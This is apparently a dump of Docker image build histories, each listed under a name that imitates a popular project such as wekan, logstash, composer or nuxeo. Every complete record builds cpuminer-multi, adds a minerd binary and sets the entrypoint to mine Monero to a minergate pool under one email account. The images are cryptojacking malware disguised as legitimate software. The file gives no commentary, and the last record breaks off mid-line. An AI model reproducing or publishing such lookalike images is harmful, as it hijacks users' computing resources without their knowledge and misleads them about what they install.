iuqshezllcom2/flux; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
mifozipcadcom/fluent; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
kuowmailfscom/wekan; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
kevoyesnezdiroorg/next; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
mariwijethersportsorg/next; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
vzprcutoutclub/swipi; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
lncfurusatotokyo/mageia; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
mowusopabmorsincom/nuxeo; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
qcnrbarryogormancom/gazebo; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
udprhukkmutk/neoj; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
mexeticrusthostcom/composer; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
juqsbarryogormancom/pipo; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
konezolenezdiroorg/logstash; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && 